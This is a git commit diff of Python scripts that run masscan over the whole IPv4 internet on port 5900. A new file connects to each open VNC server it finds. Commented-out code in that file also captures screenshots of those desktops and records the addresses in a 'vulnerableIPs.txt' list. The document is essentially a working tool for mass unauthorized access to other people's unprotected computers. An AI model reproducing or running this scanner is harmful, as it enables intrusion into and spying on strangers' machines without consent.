f41246a6abc1a0638719127476d384aa477075ec
mattp.613 <sperky7933@gmail.com>
2023-04-27 20:04:16 -0400

    before api change

--- VNCMassscan.py
+++ VNCMassscan.py
@@ -6,64 +6,18 @@ import threading
 from filelock import FileLock
 
 
-
-def parseLine(line,number):
-    parsedLine = line.split(" ")
-    if parsedLine[0] == "open" and not os.path.isfile('screenshot_IP_{ip}.png'.format(ip=parsedLine[3])):
-        #print("open at {ip}".format(ip=parsedLine[3]))
-        try:
-            #print("trying to connect to {ip}")
-            client = api.connect('{ip}:0'.format(ip=parsedLine[3]))
-            print("connected to {ip}")
-            client.captureScreen('screenshot_IP_{ip}.png'.format(ip=parsedLine[3]))
-            print("screenshot taken of {ip}")
-            with FileLock("vulnerableIPs.txt"):
-                with open('vulnerableIPs.txt', 'a') as file:
-                    file.write(parsedLine[3])
-        except:
-            pass
-            #print('Cant get image from {ip}'.format(ip=parsedLine[3]))
-
 def getIPs():
     masscanCommand = "masscan"
     #masscanParameter = '-p5900 0.0.0.0/0 --rate=100 --exclude 255.255.255.255 --output-format list --output-filename ips.txt'
     call([masscanCommand, '-p5900', '0.0.0.0/0', '--rate=10', '--exclude', '255.255.255.255', '--output-format', 'list','--output-filename','ips.txt'])
 
 
-
 def main():
     if os.geteuid() != 0:
         exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")
-    startLine = 1
-    wasShown = False
 
-    print('Press 1 for full scan then check password, press 2 for checking passwords: ')
-    x = input()
-
-    if(x != '2'):
-        ipgetter = threading.Thread(target=getIPs,args=())
-        ipgetter.start()
-
-    while True:
-        #print("you have chosen picture time")
-        lineCounter = 1
-        if os.path.isfile('ips.txt'):
-            with open("ips.txt") as f:
-                for line in f:
-                    if lineCounter >= startLine:
-                        startLine += 1
-                        thread = threading.Thread(target=parseLine,  kwargs={'line':line,'number':lineCounter})
-                        thread.start()
-                        wasShown = False
-                        #parseLine(line,lineCounter)
-                    else:
-                        if not wasShown:
-                            #print "No more to do\n"
-                            wasShown = True
-                    lineCounter += 1
-
-    return 0
-
+    ipgetter = threading.Thread(target=getIPs,args=())
+    ipgetter.start()
 
 
 
---
+++ VNCScreenshotgrabber.py
@@ -0,0 +1,79 @@
+import os
+from subprocess import call
+import api
+import os.path
+import threading
+from filelock import FileLock
+
+
+
+def parseLine(line):
+
+    parsedLine = line.split(" ")
+    try:
+        client = api.connect("{ip}:0".format(ip=parsedLine[3]))
+        print("connected to {ip}").format(ip=parsedLine[3])
+    except:
+        print('Cant get image from {ip}'.format(ip=parsedLine[3]))
+        pass
+
+
+    """
+    parsedLine = line.split(" ")
+    if parsedLine[0] == "open":
+        #print("open at {ip}".format(ip=parsedLine[3]))
+        try:
+            #print("trying to connect to {ip}")
+            client = api.connect('{ip}:0'.format(ip=parsedLine[3]))
+            print("connected to {ip}")
+            client.captureScreen('screenshot_IP_{ip}.png'.format(ip=parsedLine[3]))
+            print("screenshot taken of {ip}".format(ip=parsedLine[3]))
+            with FileLock("vulnerableIPs.txt"):
+                with open('vulnerableIPs.txt', 'a') as file:
+                    file.write(parsedLine[3])
+        except:
+            pass
+            #print('Cant get image from {ip}'.format(ip=parsedLine[3]))
+    """
+
+def main():
+
+    if os.path.isfile('ips.txt'):
+        print('List of ips detected.')
+        with open('ips.txt') as f:
+            lines = f.readlines() # list containing lines of file
+            for line in lines:
+                print(line)
+                thread = threading.Thread(target=parseLine,  kwargs={'line':line})
+                thread.start()    
+
+
+    """
+    while True:
+        lineCounter = 1
+        if os.path.isfile('ips.txt'):
+            with open("ips.txt") as f:
+                print("hello")
+                for line in f:
+                    print(line)
+                    if lineCounter >= startLine:
+                        startLine += 1
+                        thread = threading.Thread(target=parseLine,  kwargs={'line':line,'number':lineCounter})
+                        thread.start()
+                        wasShown = False
+                        #parseLine(line,lineCounter)
+                    else:
+                        if not wasShown:
+                            #print "No more to do\n"
+                            wasShown = True
+                    lineCounter += 1
+
+    return 0
+    """
+
+
+
+
+
+if __name__ == '__main__':
+    main()
